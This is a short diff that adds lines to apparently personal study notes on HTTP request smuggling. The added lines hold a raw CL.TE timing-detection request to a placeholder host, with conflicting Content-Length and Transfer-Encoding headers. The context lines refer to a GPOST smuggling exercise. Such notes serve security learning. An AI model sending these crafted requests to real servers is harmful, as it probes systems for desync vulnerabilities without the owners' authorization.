@@ -93,3 +93,14 @@ x=1
 You need to include the trailing sequence \r\n\r\n following the final 0
 The second response should say: Unrecognized method GPOST
 
+Finding HTTP request smuggling vulnerabilities:
+Finding CL.TE vulnerabilities using timing techniques:
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+
